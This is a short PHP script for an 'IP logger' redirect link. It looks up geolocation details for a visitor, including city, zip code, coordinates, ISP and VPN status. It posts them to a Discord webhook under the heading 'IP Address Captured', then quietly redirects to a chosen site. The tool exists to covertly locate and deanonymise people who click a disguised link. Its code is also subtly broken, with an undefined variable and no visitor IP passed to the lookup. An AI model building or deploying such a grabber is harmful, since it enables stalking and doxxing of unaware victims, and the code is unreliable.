<?php
const WEBHOOK_DEFAULT = "https://discordapp.com/api/webhooks/";
const IP_API_FIELDS = "16999419";

$webhook_id = base64_decode($_GET["id"]);
$target_website = base64_decode($_GET["target"]);

if ($webhook_id && $target_website) {
    $ip_details = json_decode(file_get_contents("http://ip-api.com/json/?fields=$IP_API_CODE"));

    $discord_country_flag = ":flag_" . strtolower($ip_details->countryCode) . ":";
    $mobile = $ip_details->mobile ? "Yes" : "No";
    $proxy = $ip_details->proxy ? "Yes" : "No";
    $hosting = $ip_details->hosting ? "Yes" : "No";

    $payload = json_encode(array(
        "username" => "RomeG Bot",
        "embeds" => array(
            array(
                "title" => "<---- [ :bow_and_arrow: IP Address Captured ] ---->",
                "description" => "
                    **IP:** $ip_details->query
                    **Country:** $ip_details->country $discord_country_flag
                    **Region/state:** $ip_details->regionName
                    **City:** $ip_details->city
                    **Zip code:** $ip_details->zip
                    **Geolocation:** lat: $ip_details->lat / lon: $ip_details->lon
                    **Timezone:** $ip_details->timezone
                    **ISP:** $ip_details->isp
                    **Mobile connection:** $mobile
                    **Proxy/VPN/Tor:** $proxy
                    **Hosting:** $hosting",
                "color" => hexdec("#daa520"),
                "footer" => array(
                    "text" => "RomeG"
                )
            )
        )
    ));

    $ch = curl_init(WEBHOOK_DEFAULT . $webhook_id);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/json"));
    curl_exec($ch);
    curl_close($ch);

    header("Location: $target_website");
}
